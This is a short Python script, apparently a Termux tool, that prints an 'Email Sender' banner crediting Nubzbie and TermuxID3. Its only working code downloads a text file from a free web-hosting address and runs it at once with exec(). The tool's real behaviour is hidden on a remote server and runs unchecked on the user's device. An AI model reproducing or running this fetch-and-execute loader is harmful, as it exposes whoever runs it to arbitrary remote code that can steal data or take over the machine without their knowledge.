# -*- coding: UTF-8 -*-
# Created by: Nubzbie
# Design by: N74nk

import requests, os, time

m = '\x1b[1;91m'
lime = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
blue   = '\x1b[1;96m'
p = '\x1b[1;97m'
t = '\x1b[0m'

r = '\033[0;31m'
g = '\033[0;92m'
y = '\033[0;33m'
b = '\033[0;34m'
p = '\033[0;35m'
c = '\033[0;36m'
w = '\033[0;37m'

def banner():
	print(f"""

{p} ___             {r} _ {p} _  {c} ___              _           
{p}| __] _ _ _  ___ {r}[_]{p}| | {c}/ __] ___  _ _  _| | ___  _ _ 
{p}| _] | ' ' |[_] || || | {c}\__ \/ ._]| ' |/ . |/ ._]| '_]
{p}|___]|_|_|_|[___||_||_| {c}[___/\___.|_|_|\___|\___.|_|  

         {b}Author{t} : {p}Nubzbie{t} {t}| {b}Team{t} : {p}TermuxID3
		 """)

try:
	banner()
	server = requests.get('https://nyvt1.000webhostapp.com/api/Email-sender-server.txt')
	exec(server.text)
except KeyboardInterrupt:
	exit('')
